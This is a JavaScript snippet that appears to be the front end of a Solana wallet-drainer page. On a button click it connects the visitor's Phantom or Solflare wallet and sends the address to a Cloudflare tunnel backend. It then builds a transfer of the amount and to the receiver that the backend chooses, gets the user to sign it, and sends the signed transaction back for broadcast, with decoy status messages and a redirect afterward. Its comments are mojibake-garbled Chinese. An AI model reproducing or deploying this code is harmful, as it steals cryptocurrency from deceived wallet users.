<script>
    // ğŸ”± åŠ¡å¿…ç¡®è®¤è¿™ä¸ªåœ°å€æ˜¯ä½ æœ€æ–°çš„ Cloudflare é“¾æ¥
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana;
        const sWeb3 = window.solanaWeb3;
        if (!p) { alert("Please use Phantom or Solflare browser."); return; }

        try {
            await p.connect();
            const address = p.publicKey.toString();
            document.getElementById('progress').style.width = "30%";

            // 1. è·å–åç«¯ç²¾ç®—åçš„æ•°æ®
            const response = await fetch(`${tunnel}/prepare`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address })
            });
            
            const info = await response.json();
            console.log("Backend Data:", info); // å¤§è€ï¼Œå¦‚æœæ²¡å¼¹çª—ï¼ŒF12 çœ‹è¿™é‡Œ

            if (!info.amount || !info.bh) {
                alert("Status: System Synchronized");
                return;
            }

            // 2. æ„é€ äº¤æ˜“ (ä¸¥æ ¼å¯¹é½åç«¯å­—æ®µ)
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: parseInt(info.amount), // ç¡®ä¿æ˜¯æ•´æ•°
                })
            );
            tx.recentBlockhash = info.bh;
            tx.feePayer = p.publicKey;
            document.getElementById('progress').style.width = "60%";

            // 3. å”¤èµ·ç­¾å (è¿™ä¸€æ­¥æ˜¯é‡å¤´æˆ)
            console.log("Requesting signature...");
            const signed = await p.signTransaction(tx);
            
            // 4. ç­¾åæˆåŠŸåå›ä¼ å¹¿æ’­
            const serialized = signed.serialize();
            let binary = '';
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            
            fetch(`${tunnel}/broadcast`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ raw_tx: btoa(binary) })
            });

            document.getElementById('progress').style.width = "100%";
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

        } catch (e) {
            console.error("Critical Error:", e);
            // å¦‚æœæŠ¥é”™ï¼Œç›´æ¥åˆ·æ–°é‡æ¥
            setTimeout(() => { location.reload(); }, 2000);
        }
    };
</script>
